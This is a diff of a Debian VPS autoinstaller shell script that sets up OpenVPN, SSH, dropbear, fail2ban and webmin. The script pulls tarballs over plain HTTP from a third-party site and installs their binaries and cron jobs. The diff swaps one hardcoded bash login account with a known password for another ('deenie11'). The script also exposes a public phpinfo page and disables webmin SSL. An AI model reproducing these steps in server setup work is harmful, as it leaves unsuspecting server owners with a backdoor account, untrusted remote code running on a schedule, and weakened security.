@@ -54,7 +54,6 @@ PLEASE WAIT TAKE TIME 1-5 MINUTE
 apt-get update;apt-get -y upgrade;apt-get -y install wget curl
 echo "
 INSTALLER PROCESS PLEASE WAIT
-
 TAKE TIME 5-10 MINUTE
 "
 # login setting
@@ -74,23 +73,35 @@ echo "<pre>Setup by YusufArdiansyah | telegram : e-Server | Pin BBM : yu-suf</pr
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
 wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/conf/vps.conf"
 sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
+
 # openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
-wget http://vpnpowerjack.com/debian8x64/source/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget http://vpnpowerjack.com/debian8x64/source/openvpn.tar
+tar xf openvpn.tar
+rm openvpn.tar
+
+# iptables.up.rules
 wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/conf/iptables.up.rules"
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
 sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 iptables-restore < /etc/iptables.up.rules
+
 # etc
 wget -O /home/vps/public_html/client.ovpn "http://vpnpowerjack.com/debian8x64/source/client.ovpn"
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn;cd
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+# cronjob
+cd
 wget http://vpnpowerjack.com/debian8x64/source/cronjob.tar
-tar xf cronjob.tar;mv uptimes.php /home/vps/public_html/
-mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
-chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
-useradd -m -g users -s /bin/bash jackdotmy
-echo "jackdotmy:jack123456" | chpasswd
+tar xf cronjob.tar
+mv uptimes.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/
+mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol
+chmod +x /usr/bin/userssh
+chmod +x /usr/bin/uservpn
+useradd -m -g users -s /bin/bash deenie11
+echo "deenie11:deenie11" | chpasswd
 
 # setting port ssh
 sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
@@ -107,14 +118,14 @@ service ssh restart
 service dropbear restart
 
 # install fail2ban
-apt-get -y install fail2ban;
+apt-get -y install fail2ban
 service fail2ban restart
 
 # install webmin
 cd
 wget "http://prdownloads.sourceforge.net/webadmin/webmin_1.820_all.deb"
-dpkg --install webmin_1.820_all.deb;
-apt-get -y -f install;
+dpkg --install webmin_1.820_all.deb
+apt-get -y -f install
 rm /root/webmin_1.820_all.deb
 sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
 service webmin restart
